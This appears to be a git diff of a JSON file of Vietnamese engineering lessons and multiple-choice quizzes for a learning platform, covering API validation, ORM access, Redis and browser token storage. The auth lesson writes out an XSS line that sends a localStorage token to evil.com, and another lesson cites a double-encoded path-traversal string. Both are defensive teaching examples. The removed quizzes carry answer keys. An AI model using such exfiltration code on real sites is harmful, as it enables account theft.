Encoding* như `%252e%252e%252f` vượt qua lớp lọc đơn giản).\n\n## 3. Thực hành Chuẩn Production & Anti-patterns\n\n- **Anti-pattern:** Nhận `dict[str, Any]` trực tiếp trong endpoint rồi ghi thẳng vào ORM model (lỗ hổng *Mass Assignment* — user tự gửi `\"role\": \"admin\"` để leo quyền); hoặc trả về chi tiết stack trace của DB/Python trong thông báo lỗi `422`/`500`.\n- **Chuẩn Production:**\n  - Tách biệt **Request DTO** (`PlaybookCompleteRequest`), **Response DTO** (`AssessmentSubmitResponse` — tuyệt đối không trả `password_hash` hay thông tin nội bộ) và **ORM Model**.\n  - Giới hạn kích thước payload (`max_length` trên chuỗi, `max_items` trên mảng) để chống tấn công ReDoS và cạn kiệt bộ nhớ.\n  - Chuẩn hóa **Envelope Lỗi Thống Nhất** (`{\"error_code\": \"...\", \"message\": \"...\"}`) để Frontend xử lý nhất quán và không làm lộ cấu trúc nội bộ.\n  - Áp dụng **Strict Allowlist** cho các trường nhạy cảm (ví dụ chỉ chấp nhận ngôn ngữ sandbox thuộc `{\"python\", \"javascript\", \"sql\"}`).\n\n## 4. Đánh đổi Kiến trúc (Trade-offs)\n\n| Lựa chọn | Ưu điểm | Nhược điểm |\n| :--- | :--- | :--- |\n| **`extra=\"forbid\"` (Chặt chẽ)** | Chống triệt để *Mass Assignment* và phát hiện sớm lỗi typo từ client | Dễ gãy nếu client cũ gửi thừa field không dùng khi nâng cấp API |\n| **`extra=\"ignore\"` (Mặc định Pydantic)** | An toàn Mass Assignment (vì chỉ lấy field đã khai báo), tương thích ngược tốt | Client gửi nhầm tên trường tùy chọn có thể bị bỏ qua âm thầm |\n\n## 5. Câu hỏi Phản tư & Kiểm chứng Nhanh\n\n1. Lỗ hổng **Mass Assignment** xảy ra như thế nào nếu endpoint đăng ký tài khoản truyền thẳng `**request.json()` vào hàm khởi tạo `UserModel(...)`?\n2. Sự khác biệt giữa mã lỗi `422 Unprocessable Entity` (lỗi Validate Schema) và `409 Conflict` (lỗi Bất biến Nghiệp vụ như `PLAYBOOK_NOT_COMPLETED`) là gì?\n3. Tại sao ở API Gateway phải chặn cả `%252e` (mã hóa 2 lần) thay vì chỉ kiểm tra chuỗi `..` thô trên đường dẫn?",
+      "is_shared": false
     },
     {
       "action_id": 8,
@@ -486,57 +94,8 @@
         4,
         6
       ],
-      "lesson_markdown": "## 1. So Sánh Truy Cập Dữ Liệu: ORM vs Raw SQL\n\n| Tiêu chí so sánh | ORM (SQLAlchemy 2.0) | Câu lệnh SQL Thuần (Raw SQL) |\n| --- | --- | --- |\n| Tốc độ phát triển | Nhanh, ánh xạ trực tiếp thành đối tượng Python | Chậm hơn, phải nối chuỗi và map kết quả thủ công |\n| Phòng chống SQL Injection | Tự động hóa tham số hóa truy vấn (Parameterized) | Dễ dính lỗ hổng SQLi nếu nối chuỗi không an toàn |\n| Hiệu năng tối đa | Thêm lớp trừu tượng (overhead nhỏ) | Hiệu năng cao nhất, tối ưu câu lệnh phức tạp |\n\n## 2. Thực thi Truy vấn Tham số hóa An toàn với SQLAlchemy 2.0\n\n```python\nfrom sqlalchemy import select\nfrom app.db.models import ConceptModel\n\n# Truy vấn an toàn tuyệt đối chống SQL Injection qua Parameter Binding\nstmt = select(ConceptModel).where(ConceptModel.slug == concept_slug)\nconcept = db.scalar(stmt)\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000801",
-          "display_order": 1,
-          "prompt": "Cấu hình `pool_pre_ping=True` trên SQLAlchemy Engine giúp giải quyết vấn đề thực tế nào?",
-          "options": {
-            "A": "Tự động dịch câu lệnh Python sang ngôn ngữ máy C++",
-            "B": "Kiểm tra kết nối trong Pool còn sống trước khi cấp cho request, tự động kết nối lại nếu DB vừa khởi động lại",
-            "C": "Tắt hoàn toàn cơ chế kiểm tra mật khẩu của PostgreSQL",
-            "D": "Gửi gói tin quảng bá tới toàn bộ các máy trong mạng LAN"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000802",
-          "display_order": 2,
-          "prompt": "Vấn đề hiệu năng 'N+1 Query Problem' xảy ra khi nào?",
-          "options": {
-            "A": "Khi ứng dụng chạy 1 câu truy vấn lấy danh sách N phần tử, rồi lặp N lần gọi thêm N câu truy vấn lẻ để lấy dữ liệu liên kết",
-            "B": "Khi câu lệnh SQL sử dụng phép cộng `state_version + 1`",
-            "C": "Khi bảng dữ liệu có đúng 12 dòng",
-            "D": "Khi dùng khóa chính kiểu UUID thay vì số nguyên"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000803",
-          "display_order": 3,
-          "prompt": "Cách truyền tham số nào vào câu truy vấn SQL giúp ngăn chặn triệt để lỗ hổng SQL Injection?",
-          "options": {
-            "A": "Đổi tên cổng PostgreSQL từ 5432 sang 5433",
-            "B": "Nối chuỗi bằng f-string Python rồi viết hoa từ khóa SELECT",
-            "C": "Chỉ kiểm tra độ dài chuỗi ở phía trình duyệt bằng JavaScript",
-            "D": "Sử dụng Parameterized Queries / Bound Parameters của ORM hoặc Driver thay vì nối chuỗi trực tiếp"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000804",
-          "display_order": 4,
-          "prompt": "Trong mẫu Unit of Work khi xử lý nộp bài Quiz, thời điểm nào Backend được phép cập nhật bộ nhớ đệm Redis?",
-          "options": {
-            "A": "Ngay cả khi giao dịch PostgreSQL bị ROLLBACK do lỗi",
-            "B": "Trước khi kiểm tra tính hợp lệ của dữ liệu đầu vào",
-            "C": "Sau khi giao dịch ACID trên PostgreSQL đã COMMIT thành công",
-            "D": "Không bao giờ cập nhật hoặc xóa khóa Redis khi trạng thái thay đổi"
-          },
-          "correct_option_key": "C"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nKhi hệ thống Backend phát triển, tầng truy cập dữ liệu (*Data Access Layer*) rất dễ biến thành mớ hỗn độn: truy vấn SQL nằm rải rác trong Controller, vòng lặp `for` gọi DB hàng trăm lần (**N+1 Query Problem**), hoặc hàm dịch vụ phụ thuộc cứng vào SQLAlchemy khiến việc chuyển sang Microservices hay viết Unit Test trở nên bất khả thi. Thiết kế đúng tầng **Repository / Ports & Adapters (Hexagonal Architecture)** và tối ưu cách kéo dữ liệu quyết định trực tiếp độ trễ `p95` dưới tải đồng thời.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **N+1 Query Problem & Giải pháp Eager Loading:**\n  - *Vấn đề:* Truy vấn 1 lần lấy 30 `ConceptNode`, sau đó trong vòng lặp lại truy vấn `prerequisites` và `competency` cho từng node $\rightarrow$ 1 + 60 = 61 chuyến khứ hồi mạng tới PostgreSQL!\n  - *Giải pháp:* Dùng `selectinload()` / `joinedload()` hoặc truy vấn gom lô `WHERE concept_slug IN (...)` (tối đa 2–3 câu truy vấn cố định bất kể số node tăng).\n- **Ports & Adapters (Hexagonal Architecture):**\n  - Module nghiệp vụ (`assessment`, `recommendation`) chỉ giao tiếp qua **Interface (`Protocol` / `Port`)** như `ContentCatalogPort`, `CompetencyReaderPort` và nhận về **Immutable DTO** (`ConceptNodeDTO`, `DomainGraphDTO`) chứ không bao giờ `import` trực tiếp ORM Model của schema khác (`content_svc` vs `assess_svc`).\n- **Connection Pooling (`QueuePool`):** Mở kết nối TCP + xác thực PostgreSQL rất đắt (~20–50ms). Pool giữ sẵn các kết nối mở (`pool_size`, `max_overflow`, `pool_pre_ping=True`) để tái sử dụng trong `< 1ms`.\n\n## 3. Thực hành Chuẩn Production & Anti-patterns\n\n- **Anti-pattern:** Trả ORM Model gắn với `Session` ra tận tầng Router/Serializer (gây `DetachedInstanceError` hoặc kích hoạt *Lazy Loading* ngoài ý muốn khi FastAPI serialize JSON); hoặc tạo `SELECT` trong vòng lặp `for`.\n- **Chuẩn Production:**\n  - Bật `pool_pre_ping=True` và cấu hình `pool_recycle` để tránh lỗi kết nối chết sau khi DB restart.\n  - Áp dụng **Batch Query + In-memory Dictionary Mapping** (`{row.slug: row for row in rows}`) khi cần ghép dữ liệu trong cùng một dịch vụ.\n  - Giữa các Microservices cô lập schema (như `content-service` và `assessment-grader-service`), giao tiếp qua **HTTP Internal Port + Redis Read-Through Cache** có khóa phiên bản (`plumora:kg:epoch`) thay vì truy vấn chéo schema.\n  - Dùng **Architectural Fitness Tests** (như `test_arch_bounded_context_imports.py`) tự động kiểm tra trong CI để đảm bảo không có module nào phá vỡ ranh giới nhập khẩu (*Bounded Context*).\n\n## 4. Đánh đổi Kiến trúc (Trade-offs)\n\n| Chiến lược tải dữ liệu | Độ trễ (Latency) | Độ phức tạp Code | Phù hợp khi |\n| :--- | :--- | :--- | :--- |\n| **Lazy Loading (Mặc định ORM)** | Rất cao (dễ dính `N+1`) | Thấp lúc viết | Tuyệt đối tránh trong API Production |\n| **Batch `IN (...)` + Dict Map** | Thấp (2–3 queries cố định) | Trung bình | Tải danh sách vừa/lớn nhiều quan hệ song song |\n| **Ports & Adapters + Cache** | Cực thấp (`< 2ms` khi Hit Redis) | Cao hơn (có Port/DTO) | Hệ thống Microservices cần cô lập Schema & chịu tải cao |\n\n## 5. Câu hỏi Phản tư & Kiểm chứng Nhanh\n\n1. Giải thích cơ chế gây nghẽn của lỗi **N+1 Query** và cách kiểm chứng bằng bộ đếm số lượng SQL query trong bài test tích hợp?\n2. Tại sao trả thẳng SQLAlchemy ORM Model ra khỏi tầng Service để FastAPI tự serialize có thể gây lỗi bất ngờ hoặc rò rỉ truy vấn DB?\n3. Trong kiến trúc **Hexagonal (Ports & Adapters)** của Plumora, `CompetencyReaderPort` mang lại lợi ích gì khi tách `assessment-grader-service` khỏi `recommendation-ai-service`?",
+      "is_shared": false
     },
     {
       "action_id": 9,
@@ -547,57 +106,8 @@
         5,
         6
       ],
-      "lesson_markdown": "## 1. So Sánh Các Chiến Lược Caching Phổ Biến\n\n| Chiến lược Caching | Cách thức Vận hành | Ưu điểm & Đánh đổi |\n| --- | --- | --- |\n| `Cache-Aside` (Lazy Loading) | Ứng dụng đọc Cache trước; nếu miss thì đọc DB rồi ghi vào Cache | Giảm tải DB, nhưng lần đọc đầu tiên bị chậm (Cache Miss) |\n| `Write-Through` (Plumora D-10) | Khi cập nhật, ghi đồng thời vào DB và Cache trong cùng luồng | Dữ liệu luôn nhất quán, nhưng tăng nhẹ độ trễ lúc ghi |\n| `Write-Behind` (Write-Back) | Ghi vào Cache trước, sau đó bất đồng bộ đẩy xuống DB | Tốc độ ghi cực nhanh, nhưng rủi ro mất dữ liệu nếu Redis crash |\n\n## 2. Triển khai Write-Through Cache trong Plumora\n\n```python\ndef write_through_state_cache(db: Session, user_id: UUID) -> None:\n    \"\"\"Đồng bộ trạng thái từ PostgreSQL sang Redis ngay sau khi COMMIT.\"\"\"\n    state_vector = compute_24d_observation(db, user_id)\n    redis_client.setex(\n        f\"plumora:state:{user_id}\",\n        3600,\n        json.dumps({\"vector\": state_vector, \"version\": user.state_version})\n    )\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000000901",
-          "display_order": 1,
-          "prompt": "Trong kiến trúc Plumora, khi dịch vụ Redis bị dừng đột ngột hoặc timeout, API khuyến nghị `POST /api/v1/recommendations` phải hoạt động như thế nào?",
-          "options": {
-            "A": "Trả về vector toàn số 0 giả mạo dù người học đã hoàn thành nhiều bài",
-            "B": "Trả về lỗi 500 Internal Server Error và dừng toàn bộ hệ thống",
-            "C": "Tự động đọc trực tiếp từ PostgreSQL để dựng vector 24 chiều và trả về `state_source = 'postgres_fallback'` mà không gây lỗi 500",
-            "D": "Tự động xóa dữ liệu trong PostgreSQL để đồng bộ với Redis"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000902",
-          "display_order": 2,
-          "prompt": "Trường `state_version` được lưu kèm trong payload `plumora:state:{user_id}` trên Redis nhằm mục đích gì?",
-          "options": {
-            "A": "Thay thế hoàn toàn khóa chính UUID của bảng users",
-            "B": "Lưu mật khẩu đăng nhập dạng văn bản rõ",
-            "C": "Đếm số lượng câu hỏi trong một đề Quiz",
-            "D": "Đối chiếu tính mới nhất của dữ liệu đệm so với phiên bản trạng thái chuẩn của người học trên PostgreSQL"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000903",
-          "display_order": 3,
-          "prompt": "Khi xảy ra Cache Miss (khóa `plumora:state:{user_id}` chưa tồn tại trên Redis nhưng dịch vụ Redis vẫn hoạt động tốt), hệ thống làm gì?",
-          "options": {
-            "A": "Đọc từ PostgreSQL, dựng vector 24 chiều, ghi nạp lại vào Redis với TTL 3600s và báo `state_source = 'postgres_cache_warm'`",
-            "B": "Bắt người học phải đăng ký lại tài khoản mới",
-            "C": "Báo lỗi 403 CONCEPT_LOCKED",
-            "D": "Tắt dịch vụ Redis vĩnh viễn"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000000904",
-          "display_order": 4,
-          "prompt": "Việc đặt thời gian sống `TTL = 3600s` (qua lệnh `SETEX`) cho khóa trạng thái trên Redis có tác dụng gì?",
-          "options": {
-            "A": "Xóa vĩnh viễn tài khoản người học trong PostgreSQL sau 1 giờ",
-            "B": "Giải phóng bộ nhớ cho các phiên không còn hoạt động và giới hạn thời gian tồn tại của dữ liệu cũ nếu có sự cố mạng",
-            "C": "Làm cho mô hình DQN phải huấn luyện lại từ đầu mỗi giờ",
-            "D": "Tăng kích thước vector Observation từ 24 lên 3600 chiều"
-          },
-          "correct_option_key": "B"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nTrong hệ thống Microservices như Plumora, Redis thường gánh đồng thời 3 vai trò khác nhau: **State Cache** (lưu vector đặc trưng RL với độ trễ <1ms), **Token Revocation Blocklist** (thu hồi JWT), và **Message Broker (Redis Streams)** truyền sự kiện liên dịch vụ (`CompetencyUpdatedEvent`, `DomainGraphUpdatedEvent`). Vì Redis lưu toàn bộ dữ liệu trên RAM và xử lý lệnh theo mô hình đơn luồng, việc cấu hình sai cơ chế lưu trữ bền vững (**Persistence**) hoặc chính sách giải phóng bộ nhớ (**Eviction Policy**) có thể dẫn tới mất toàn bộ hàng đợi sự kiện hoặc treo cụm khi tràn RAM.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **RDB Snapshot vs AOF (Append-Only File):**\n  - **RDB:** Định kỳ gọi `fork()` tạo tiến trình con chụp ảnh nhị phân toàn bộ RAM xuống đĩa. File gọn, khởi động lại cực nhanh nhưng có thể mất dữ liệu giữa 2 lần chụp (ví dụ 5 phút).\n  - **AOF (`appendfsync everysec`):** Ghi nối tiếp mọi lệnh ghi vào tệp nhật ký mỗi giây. Độ bền cao (tối đa mất 1 giây dữ liệu) nhưng file lớn hơn và cần cơ chế nén nền (`BGREWRITEAOF`). Production thường bật kết hợp cả hai (**RDB + AOF**).\n- **Chính sách Thu hồi Bộ nhớ (`maxmemory-policy`):**\n  - Khi dùng làm thuần Cache: đặt `allkeys-lru` (xóa key ít dùng nhất gần đây) hoặc `volatile-lru` (chỉ xóa các key có đặt TTL).\n  - **Cảnh báo:** Nếu Redis dùng chung cho **Redis Streams** (không đặt TTL), đặt `allkeys-lru` có thể xóa mất cả khóa Stream khi đầy RAM! Hãy dùng `volatile-lru` hoặc tách riêng instance Redis cho Cache và Streams.\n- **Redis Streams & Consumer Groups:** Lệnh `XADD`, `XREADGROUP`, `XACK` cho phép nhiều worker song song tiêu thụ sự kiện mà không xử lý trùng lặp, kèm danh sách chờ `XPENDING` để thu hồi tin nhắn bị rớt.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```ini\n# Cấu hình redis.conf chuẩn Production (kết hợp RDB + AOF và bảo vệ RAM)\nmaxmemory 512mb\nmaxmemory-policy volatile-lru\n\n# Bật AOF đồng bộ đĩa mỗi giây + định dạng lai RDB-AOF để khởi động nhanh\nappendonly yes\nappendfsync everysec\naof-use-rdb-preamble yes\n\n# Ngắt các lệnh chặn nguy hiểm làm treo đơn luồng Redis\nrename-command FLUSHALL \"\"\nrename-command KEYS \"\"\n```\n\n```bash\n# Kiểm tra tỷ lệ Cache Hit, bộ nhớ và hàng đợi Redis Streams Consumer Group\nredis-cli INFO stats | grep -E \"keyspace_hits|keyspace_misses|evicted_keys\"\nredis-cli XINFO GROUPS plumora:competency_events\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Chạy lệnh `KEYS *` trên Production:** Lệnh có độ phức tạp `O(N)` chạy đơn luồng sẽ khóa cứng Redis trong nhiều giây, gây timeout dây chuyền lên toàn bộ Microservices. Luôn thay bằng `SCAN`.\n- **Tăng vọt RAM khi chạy `BGSAVE` (Copy-on-Write):** Khi tiến trình con chụp RDB mà tiến trình cha ghi dữ liệu dồn dập, hệ điều hành phải nhân bản các trang nhớ bị sửa, có thể làm RAM tiêu thụ tăng gấp đôi đột ngột và dính OOMKill.\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Cơ chế Redis | Ưu điểm | Đánh đổi vận hành |\n| --- | --- | --- |\n| **RDB Snapshot** | Tệp nhỏ gọn, phục hồi sau sự cố cực nhanh | Có thể mất dữ liệu trong khoảng thời gian giữa 2 lần chụp |\n| **AOF (`everysec`)** | Độ bền cao (tối đa mất 1s), dễ kiểm tra nhật ký lệnh | Tốn I/O đĩa và dung lượng lớn hơn RDB |\n| **Tách Redis Cache & Redis Streams** | Không bao giờ bị eviction xóa nhầm hàng đợi sự kiện | Tốn thêm chi phí vận hành 2 cụm/container độc lập |",
+      "is_shared": true
     },
     {
       "action_id": 10,
@@ -608,57 +118,8 @@
         6,
         9
       ],
-      "lesson_markdown": "## 1. So Sánh Xác Thực: Cookie HttpOnly vs Bearer JWT Token\n\n| Thuộc tính Bảo mật | Cookie Phiên (HttpOnly, SameSite) | Bearer Token (JWT trong Header) |\n| --- | --- | --- |\n| Chống tấn công XSS | Miễn nhiễm (JavaScript không thể đọc `document.cookie`) | Dễ bị đánh cắp nếu lưu trong `localStorage` |\n| Chống tấn công CSRF | Cần cờ `SameSite=Lax/Strict` hoặc Anti-CSRF Token | Miễn nhiễm tự nhiên với CSRF truyền thống |\n| Thu hồi phiên (Revocation) | Dễ dàng (xóa phiên trong Redis / DB) | Khó hơn (cần Token Blacklist hoặc thời gian sống ngắn) |\n\n## 2. Băm Mật Khẩu An Toàn và Tạo Chữ Ký JWT\n\n```python\nimport jwt\nfrom passlib.context import CryptContext\n\npwd_context = CryptContext(schemes=[\"bcrypt\"], deprecated=\"auto\")\n\n# Băm mật khẩu với muối ngẫu nhiên (Salt)\nhashed_pwd = pwd_context.hash(\"PlumoraDemo#2026\")\n\n# Tạo JWT Access Token có thời hạn (TTL) và chữ ký HMAC-SHA256\ntoken = jwt.encode({\"sub\": str(user_id), \"exp\": exp_time}, SECRET_KEY, algorithm=\"HS256\")\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000001001",
-          "display_order": 1,
-          "prompt": "Vì sao mật khẩu người dùng phải được băm bằng thuật toán chuyên dụng như Argon2id thay vì băm nhanh SHA-256 thông thường?",
-          "options": {
-            "A": "Vì Argon2id có muối (Salt) riêng và tiêu tốn bộ nhớ/thời gian có kiểm soát, chống lại tấn công dò mật khẩu tốc độ cao bằng GPU/ASIC",
-            "B": "Vì Argon2id cho phép giải mã ngược mật khẩu về dạng văn bản rõ để hiển thị lên màn hình",
-            "C": "Vì SHA-256 chỉ chạy được trên hệ điều hành Windows",
-            "D": "Vì Argon2id không cần lưu kết quả băm vào cơ sở dữ liệu"
-          },
-          "correct_option_key": "A"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001002",
-          "display_order": 2,
-          "prompt": "Lỗ hổng IDOR (Insecure Direct Object Reference) xảy ra khi nào và cách phòng chống chuẩn trong Plumora là gì?",
-          "options": {
-            "A": "Phòng chống bằng cách cho phép mọi người dùng sửa dữ liệu của nhau",
-            "B": "Xảy ra khi dùng phông chữ monospace cho mã nguồn SQL",
-            "C": "Xảy ra khi server tin vào `user_id` do client truyền lên mà không kiểm tra quyền; phòng chống bằng cách luôn ràng buộc truy vấn theo `current_user.id` từ phiên xác thực",
-            "D": "Chỉ xảy ra khi không có kết nối Internet"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001003",
-          "display_order": 3,
-          "prompt": "Khi đăng nhập thất bại do sai tên đăng nhập hoặc sai mật khẩu, vì sao API nên trả chung một mã lỗi `401 INVALID_CREDENTIALS`?",
-          "options": {
-            "A": "Vì giao thức HTTP không có mã trạng thái nào khác ngoài 401",
-            "B": "Để ngăn kẻ tấn công dò quét danh sách tên tài khoản đang tồn tại trong hệ thống (Username Enumeration)",
-            "C": "Để tự động đăng ký tài khoản mới cho kẻ tấn công",
-            "D": "Vì PostgreSQL không phân biệt được tên người dùng và mật khẩu"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001004",
-          "display_order": 4,
-          "prompt": "Nguyên tắc Tối thiểu hóa Dữ liệu Cá nhân (Data Minimization - D-11) được áp dụng trên bảng `users` như thế nào?",
-          "options": {
-            "A": "Xóa bảng `users` mỗi khi có người đăng nhập",
-            "B": "Lưu toàn bộ mật khẩu dạng rõ và lịch sử duyệt web của người dùng",
-            "C": "Không lưu `password_hash` để ai cũng đăng nhập được",
-            "D": "Chỉ lưu các trường thiết yếu (`id`, `username`, `display_name`, `password_hash`, `state_version`, `created_at`), không thu thập CCCD, số điện thoại hay địa chỉ nhà"
-          },
-          "correct_option_key": "D"
-        }
-      ]
+      "lesson_markdown": "## 1. Mô hình Tư duy & Bài toán Thực tế\n\nTrình duyệt là một **môi trường không đáng tin cậy (Untrusted Client Environment)**: mọi mã JavaScript chạy trên trang (bao gồm cả thư viện npm bên thứ ba hoặc script bị tiêm qua lỗ hổng XSS) đều có thể đọc toàn bộ `localStorage`, `sessionStorage` và biến toàn cục trong RAM. Do đó, kiến trúc xác thực phía Frontend phải bảo vệ thẻ phiên đăng nhập khỏi bị đánh cắp, đồng thời phân tách rạch ròi giữa **điều hướng UI theo vai trò (Route Guard)** và **thực thi quyền hạn thực sự tại Backend**.\n\n## 2. Cơ chế Hoạt động Tầng sâu\n\n- **HttpOnly, Secure, SameSite Cookie:** Khi đăng nhập thành công, Backend gắn JWT/Session ID vào header `Set-Cookie: plumora_session=...; HttpOnly; Secure; SameSite=Lax; Path=/`. Trình duyệt tự động đính kèm cookie này trong mọi request tới API mà **mã JavaScript (`document.cookie`) không bao giờ đọc được giá trị token**.\n- **Khôi phục phiên (Session Bootstrap):** Khi người dùng mở lại tab hoặc nhấn F5, Frontend không tự giải mã token mà gọi `GET /api/v1/auth/me` để máy chủ xác thực chữ ký JWT, kiểm tra danh sách thu hồi (JTI Blocklist trong Redis) và trả về hồ sơ + `role` hiện hành.\n- **Bảo vệ phân quyền RBAC 2 lớp:**\n  - **Lớp 1 (UX Route Guard trên Client):** Chặn `learner` vào giao diện `/admin/*` hoặc `/expert/*`, hiển thị trang `403 Forbidden` rõ ràng.\n  - **Lớp 2 (Security Enforcement trên Server):** Backend luôn kiểm tra vai trò từ chữ ký phiên trên mọi endpoint; tuyệt đối không tin cờ `isAdmin` gửi từ trình duyệt.\n\n## 3. Ví dụ Mã nguồn Thực chiến\n\n```typescript\n// Kiểm tra quyền truy cập Route Guard phía Frontend (chỉ phục vụ UX, Server vẫn kiểm tra độc lập)\nexport type UserRole = 'learner' | 'expert' | 'admin';\n\nexport function canAccessPortal(role: UserRole | null, portal: 'learner' | 'expert' | 'admin'): boolean {\n  if (!role) return false;\n  if (portal === 'admin') return role === 'admin';\n  if (portal === 'expert') return role === 'expert' || role === 'admin';\n  return role === 'learner';\n}\n\n// Xử lý đăng xuất an toàn: gọi Server hủy JTI trên Redis + xóa sạch cache dữ liệu cục bộ\nexport async function performSecureLogout(clearQueryCache: () => void): Promise<void> {\n  try {\n    await fetch('/api/v1/auth/logout', { method: 'POST', credentials: 'include' });\n  } finally {\n    clearQueryCache(); // Tránh lộ dữ liệu tài khoản cũ nếu người khác dùng chung máy\n  }\n}\n```\n\n## 4. Các Sự cố & Bẫy Phổ biến\n\n- **Lưu Access Token / Refresh Token trong `localStorage`:** Chỉ cần một lỗ hổng XSS nhỏ ở bất kỳ dependency nào, kẻ tấn công có thể chạy `fetch('https://evil.com?t=' + localStorage.getItem('token'))` và chiếm toàn bộ tài khoản.\n- **Tin vào kiểm tra ẩn nút ở Frontend:** Chỉ ẩn nút \"Kích hoạt mô hình\" trên UI mà Backend không gắn `require_roles('admin')` sẽ dẫn tới lỗ hổng leo thang đặc quyền (Broken Access Control).\n\n## 5. Bảng Đánh đổi Kiến trúc\n\n| Nơi lưu trữ Token | Chống XSS | Chống CSRF | Đánh đổi vận hành |\n| --- | --- | --- | --- |\n| **`HttpOnly; SameSite=Lax` Cookie** | Rất cao (JS không đọc được) | Cao (chặn gửi cookie trên POST xuyên miền) | Cần cấu hình chuẩn CORS `credentials: include` & CSRF Token cho thao tác nhạy cảm |\n| **`localStorage` + `Authorization: Bearer`** | Thấp (dễ bị đánh cắp qua XSS) | Miễn nhiễm tự nhiên với CSRF | Đơn giản khi gọi nhiều domain nhưng rủi ro bảo mật cao |\n| **In-memory JS Variable + HttpOnly Refresh Cookie** | Cao (Access Token sống ngắn trong RAM) | Cao | Phải xử lý silent refresh khi nhấn F5 hoặc mở tab mới |",
+      "is_shared": true
     },
     {
       "action_id": 11,
@@ -670,57 +131,8 @@
         8,
         10
       ],
-      "lesson_markdown": "## 1. Phòng Thủ Các Lỗ Hổng Bảo Mật OWASP API Top 10\n\n| Lỗ hổng OWASP | Nguy cơ Kỹ thuật | Cơ chế Phòng vệ trong Plumora |\n| --- | --- | --- |\n| `API1: BOLA / IDOR` | Người dùng đổi ID trong URL để đọc dữ liệu người khác | Xác thực danh tính qua Token và ràng buộc `WHERE user_id = me.id` |\n| `API2: Broken Authentication` | Token bị lộ hoặc không kiểm tra chữ ký | Ký JWT với thuật toán bảo mật và kiểm tra thời hạn `exp` |\n| `API3: Broken Object Property` | Rò rỉ thông tin mật (mật khẩu băm, UUID nội bộ) | Dùng Pydantic Response Model ẩn toàn bộ trường nhạy cảm |\n| `API4: Unrestricted Resource` | Tấn công từ chối dịch vụ DoS do gọi API liên tục | Áp dụng giới hạn tần suất gọi (Rate Limiting) qua Redis |\n\n## 2. Kiểm Soát Quyền Truy Cập (RBAC) với FastAPI Dependency\n\n```python\nfrom fastapi import Depends, HTTPException, status\n\ndef require_concept_unlocked(slug: str, user = Depends(get_current_user), db = Depends(get_db)):\n    \"\"\"Kiểm tra điều kiện tiên quyết trước khi cho phép học hoặc thi.\"\"\"\n    if not is_concept_eligible(db, user.id, slug):\n        raise HTTPException(\n            status_code=status.HTTP_403_FORBIDDEN,\n            detail=\"403 CONCEPT_LOCKED: Cần đạt >= 75% ở các bài tiên quyết.\"\n        )\n```",
-      "questions": [
-        {
-          "id": "00000000-0000-4000-8000-000000001101",
-          "display_order": 1,
-          "prompt": "Cấu hình CORS nào dưới đây đảm bảo an toàn khi API có sử dụng Cookie xác thực (`allow_credentials=True`)?",
-          "options": {
-            "A": "Mở cổng PostgreSQL 5432 ra địa chỉ công cộng 0.0.0.0",
-            "B": "Cho phép mọi tên miền bất kỳ đọc dữ liệu phiên xác thực",
-            "C": "Tắt hoàn toàn kiểm tra chữ ký JWT",
-            "D": "Chỉ định rõ danh sách Origin tin cậy (ví dụ `http://127.0.0.1:5173`) thay vì dùng ký tự đại diện `*`"
-          },
-          "correct_option_key": "D"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001102",
-          "display_order": 2,
-          "prompt": "Header bảo mật `X-Frame-Options: DENY` và `Content-Security-Policy: frame-ancestors 'self'` giúp ngăn chặn cuộc tấn công nào?",
-          "options": {
-            "A": "Mất điện tại trung tâm dữ liệu",
-            "B": "Clickjacking (nhúng trang web vào iframe ẩn trên trang độc hại để lừa người dùng bấm nút)",
-            "C": "Tràn bộ nhớ đệm trong thuật toán sắp xếp",
-            "D": "Lỗi chia cho số 0 trong Python"
-          },
-          "correct_option_key": "B"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001103",
-          "display_order": 3,
-          "prompt": "Vì sao Backend phải kiểm tra mã băm `SHA-256` của tệp `checkpoint.zip` trước khi nạp mô hình RL vào bộ nhớ?",
-          "options": {
-            "A": "Để bỏ qua việc kiểm tra điều kiện tiên quyết của bài học",
-            "B": "Để tăng gấp đôi số tầng của đồ thị DAG",
-            "C": "Để xác minh tính toàn vẹn của tệp mô hình, tránh nạp tệp bị hỏng hoặc bị đánh tráo trái phép",
-            "D": "Để tự động đổi mật khẩu của người dùng"
-          },
-          "correct_option_key": "C"
-        },
-        {
-          "id": "00000000-0000-4000-8000-000000001104",
-          "display_order": 4,
-          "prompt": "Khi tệp `checkpoint.zip` bị thiếu hoặc không khớp mã băm `SHA-256`, hành vi an toàn và trung thực của API khuyến nghị là gì?",
-          "options": {
-            "A": "Chuyển sang chiến lược dự phòng theo tầng DAG và khai báo rõ `policy_source = 'fallback_rule'`, `degraded = true`",
-            "B": "Vẫn gắn nhãn `policy_source = 'dqn'` để đánh lừa người dùng",
-            "C": "Làm sập tiến trình máy chủ với lỗi Unhandled Exception",
-            "D": "Mở khóa toàn bộ 12 bài học cho mọi tài khoản chưa đăng nhập"
-          },
-          "correct_option_key": "A"
-        }
-      ]
